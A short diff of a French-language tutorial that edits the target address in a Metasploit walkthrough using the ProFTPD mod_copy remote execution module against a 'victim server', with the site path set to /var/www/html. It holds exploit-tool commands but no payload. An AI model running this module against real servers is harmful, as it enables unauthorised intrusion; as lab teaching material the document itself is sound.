@@ -49,7 +49,7 @@ use exploit/unix/ftp/proftpd_modcopy_exec
 
 Ensuite, nous devons définir l'hôte distant (serveur victime)
 
-set RHOST 192.168.1.22
+set RHOST 192.168.0.22
 
 set SITEPATH /var/www/html
 
